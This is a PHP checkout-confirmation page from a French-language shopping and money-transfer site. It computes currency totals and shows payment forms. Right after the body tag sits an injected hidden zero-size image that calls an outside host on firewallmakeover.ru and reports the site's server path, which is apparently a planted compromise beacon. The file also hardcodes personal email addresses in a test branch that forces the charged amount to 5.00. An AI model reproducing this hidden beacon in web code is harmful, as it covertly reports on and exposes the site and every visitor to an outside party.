<?php
/* Programme : confirme_achat.php
* Description : Demande confirmation de l'usager pour un achat sur le site WEB.
* Auteur : Denis Léveillé 	 		  Date : 2007-10-28

I understand that iWeb Technologies inc. is the name that will appear on my credit card statement even if the account was opened 
with an affiliate. I will not refute the charge based on the name that will appear on my statement. 
I will communicate directly with iWeb Technologies inc. for all questions and problems related to the services billed.

*/
include('lib/config.php');

$TabService = 	get_service("ARGENT/CASH");	   
$TabUnite = 	get_unite();
$TabTrs =  		get_money( "Transfert" );
$TabModPay = 	get_Modepaye( ); 

 
	$infosClient = infos_client( $_SESSION[$_SERVER['SERVER_NAME']] );

//	$Service		= $_SESSION['transaction']['Service'];
	$Service		= $_SESSION['Service'];
	$FctDate		= $_SESSION['Totaux']['DateFacture'];
	$TxCUC_USD	= get_TauxVente("CUC"); 
	$TXUSD_CAD	= get_TauxVente("CAD"); 
	$TXUSD_EUR	= get_TauxVente("EUR"); 
	
	if( ($TabUnite[$Service] == "POID/WEIGHT") || ($TabUnite[$Service] == "UNITÉ/UNIT") ) {
		switch( $_SESSION['devise'] ) {
			case 'CUC':	$image = 'images/cuba.gif';
							$STotal = $_SESSION['Totaux']['SousTotalCUC'];
							$Livraison = $_SESSION['Totaux']['LivraisonCUC'];
							$Frais = rounder( $_SESSION['Totaux']['Frais']  * $TxCUC_USD);
							$Total =  $_SESSION['Totaux']['TotalCUC'];
							break;
			case 'USD':	$image = 'images/usa.gif';
							$STotal = $_SESSION['Totaux']['SousTotalUSD'];
							$Livraison = $_SESSION['Totaux']['LivraisonUSD'];
							$Frais = $_SESSION['Totaux']['Frais'];
							$Total =  $_SESSION['Totaux']['TotalUSD'];
							break;
			case 'EUR':	$image = 'images/europe.gif';
							$STotal = $_SESSION['Totaux']['SousTotalEUR'];
							$Livraison = $_SESSION['Totaux']['LivraisonEUR'];
							$Frais = rounder( $_SESSION['Totaux']['Frais'] * $TXUSD_EUR );
							$Total =  $_SESSION['Totaux']['TotalEUR'];
							break;
			default:		$image = 'images/canada.gif';
							$STotal = $_SESSION['Totaux']['SousTotalCAD'];
							$Livraison = $_SESSION['Totaux']['LivraisonCAD'];
							$Frais = rounder( $_SESSION['Totaux']['Frais'] * $TXUSD_CAD );
							$Total =  $_SESSION['Totaux']['TotalCAD'];
							break;
		} // switch
		
		$Symbole	=	get_Symbole($_SESSION['devise']);
	}
	
	if( $TabUnite[$Service] == "ARGENT/CASH" ) {
	
		// **** Choix de la langue de travail ****
		switch( $_SESSION['langue'] ) {
			case "en" : 	include("trsmessen.inc");
								break;
			case "fr" : 	include("trsmessfr.inc");
								break;
			default : 		include("trsmesssp.inc");  
		} // switch SLangue
		
		
		$Transfert	=	$_SESSION['transaction']['Transfert'];
		$TransUS		=	$_SESSION['transaction']['TransUS'];
		$FrTransant =	$_SESSION['transaction']['FrTransant'];
		$FrFixe		=	$_SESSION['transaction']['FrFixe'];
		$CoutUS		=	$_SESSION['transaction']['CoutUS'];
		$CurTrans	=	$_SESSION['transaction']['CurTrans'];
		$Pourcent	=	$_SESSION['transaction']['Pourcent'];
		$Plus			=	$_SESSION['transaction']['Plus'];
		$ModePaye	=	$_SESSION['paiement']['ModePaye'];
		$Total		=	$_SESSION['Totaux']['totalpourbanque']; 
	
	
		if( $_SESSION['devise'] == 'USD' ){
			$image = 'images/usa.gif';
		}
		elseif( $_SESSION['devise'] == 'EUR' ){
			$image = 'images/europe.gif';
		}
		else
			$image = 'images/canada.gif';
			
		$imageUSD = 'images/usa.gif';
	
		if( $CurTrans == 'CUC' ){
			$imageTRS = 'images/cuba.gif';
		}
		elseif( $CurTrans == 'USD' ){
			$imageTRS = 'images/usa.gif';
		}
		elseif( $CurTrans == 'EUR' ){
			$imageTRS = 'images/europe.gif';
		}
		else{
			$imageTRS = 'images/canada.gif';
		}
		$DevDisp = $_SESSION['devise'];
		$TauxChg = get_TauxVente($DevDisp);
		$Titre = $txt['sommaire_du_transfert'];
	}



	
//	$_AVECENTETE = 1;
	$_AVECCLIENT = 1;
//	$EN_PANIER	= 1;
	$_AVECITEM = 1;
	$_AVECTOTAL = 1;
	$_Retour = 'confirme_achat';


//		<link href='styles/style.css' rel='stylesheet' type='text/css'>
//		<link href='styles/stylesheet.css' rel='stylesheet' type='text/css'>

	
echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<base target='MAIN'>
	</head>
	
<style type='text/css'>
body
{
	font-family: Verdana, Arial, Helvetica, sans-serif;
	margin-top:0;
	margin-left:0;
	margin-right:0;
	margin-bottom:0;
	text-decoration: none;
}

.titreWhiteCenter {

	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	font-style: normal;
	color: #FFFFFF;
	text-align: center;
	font-weight: bold;
}


td, div, p, ul
{
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	text-decoration: none;
}
</style>
	
<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>";
	
$monPanier = panierInfos($_SESSION['panier']);          
          
// HTML pour l'entête du panier, genre <table> avec les entêtes de colonnes          
if( ( $_SESSION['Service'] == $_SERVICE_ACHAT ) && ($monPanier == false) ) {
   // HTML pour un panier vide
	echo "<p align=center><font size +2><b>".$txt['votre_panier_est_vide']."</b></font></p><br>";
}
else {
	
?> 
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' > 
				<tr>
					<td bgcolor='#96B2CB' height='16' Valign='top'> 
						<img src='images/panier.gif' width='14' height='13'/> <font color='#FFFFFF' ><b><?=$txt['paiement_en_ligne_securise']?></b></font>
					</td>
				</tr>
			</table>
		</td>	
	</tr>
	<tr>
		<td colspan='2'  Valign='top'>
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' bordercolor='#9EA2AB' style='margin-top:2px;' >
<?php	include('facture.inc'); ?>
			</table>
		</td>
	</tr>
	<tr>
		<td colspan='2'  Valign='top'>
        <input name="transid" TYPE="hidden" VALUE="<?php echo( Get_TransId() ); ?>">
<?php
 // debut des types de paiement
	switch ( $_SESSION['paiement']['ModePaye']  ) {
		case 1 : 
		case 3 : echo "<FORM method='post' action='checkout_accepted.php'>";
					echo "
						 	<div align='center'>
								<br>";
					break;
		case 4 : 
		case 11: echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=chk_interac.php'>";
					echo "
						 	<div align='center'>
								<br>";
					break;
		case 5 : 
		case 6 : 
		case 7 :  
		default:	/* ============ POUR TEST ================ */
					if( 	($infosClient['Courriel'] == "kin.coder@gmail.com") || 
							($infosClient['Courriel'] == "jean-alexandredenis@hotmail.com") || 
							($infosClient['Courriel'] == "webmaster@jean-alexandre.ca") || 
							($infosClient['Courriel'] == "postmaster@transant.com") ) {
							
						echo "<div align='center'>***** IN TEST ***** ".$param['nom_client']."</div>";
						if( $_SESSION['Totaux']['totalpourbanque'] > $infosClient['MaxAchat'] )
							echo "<FORM METHOD='POST' ACTION='checkout_depasse_msg.php'>";
						else {
							if( isset($_SESSION['paiement']['trnCardNumber']) )
								echo "<FORM METHOD='POST' ACTION='confirme_envoi.php'>";
							else
								echo "<FORM METHOD='POST' ACTION='checkout_arret_msg.php'>";
						}
						$_SESSION['Totaux']['totalpourbanque'] = "5.00"; //number_format($_SESSION['Totaux']['totalpourbanque']).".00"; // 
					}
					else {
						if( $_SESSION['Totaux']['totalpourbanque'] > $infosClient['MaxAchat'] )
							echo "<FORM METHOD='POST' ACTION='checkout_depasse_msg.php'>";
						else {
							if( isset($_SESSION['paiement']['trnCardNumber']) )
								echo "<FORM METHOD='POST' ACTION='confirme_envoi.php'>";
							else
								echo "<FORM METHOD='POST' ACTION='checkout_arret_msg.php'>";
						}
					}
					echo "
						 	<div align='center'>
								<b>".$_SESSION['Totaux']['totalpourbanque'].$txt['facture_votre_carte']."</b><br>
								<br>";
					break;
	} // Si mode de paiement
	echo "
			<input type='submit' value='".$txt['placer_ma_commande']."'>
		</div>
	</form>";

?>
<script language='javascript'>
//	if( top.window.frames[0] && top.window.frames[0].Recharge )
//		top.window.frames[0].Recharge();
		
function ouvre_plein_ecran(fichier) {
	ff=window.open(fichier,"pop","'','toolbar=no,status=no,scrollbar=no,width=388,height=110, left=330, top=330'");
 	ff.focus();
}  

function Rafraichie(){
	window.location.reload();
//	open( "confirme_achat.php", "_self" );
}
</script>
<?php
} // FIN DU PANIER N'EST PAS VIDE 
?>

			</td>
		</tr>
	</table>
</body>
</html>
